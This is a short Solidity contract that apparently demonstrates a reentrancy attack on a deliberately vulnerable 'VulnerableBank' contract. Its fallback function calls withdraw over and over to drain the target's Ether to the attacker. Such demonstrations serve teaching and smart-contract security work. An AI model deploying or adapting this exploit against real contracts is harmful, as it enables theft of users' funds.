//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public vulnerableBank;

    //Initialize with the address of the VulnerableBank contract.
    constructor(address _vulnerableBankAddress) public {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    //Fallback function gets triggered when VulnerableBank sends Ether.
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            //Keep draining funds by calling withdraw again.
            vulnerableBank.withdraw(1 ether);
        }
    }

    //Function to start the attack.
    function attack() public payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH to attack");
        //Deposit Ether into VulnerableBank.
        vulnerableBank.deposit{value: 1 ether}();
        //Start the withdrawal process.
        vulnerableBank.withdraw(1 ether);
    }

    //Helper function to withdraw Ether from the attacker contract.
    function collectFunds() public {
        msg.sender.transfer(address(this).balance);
    }
}
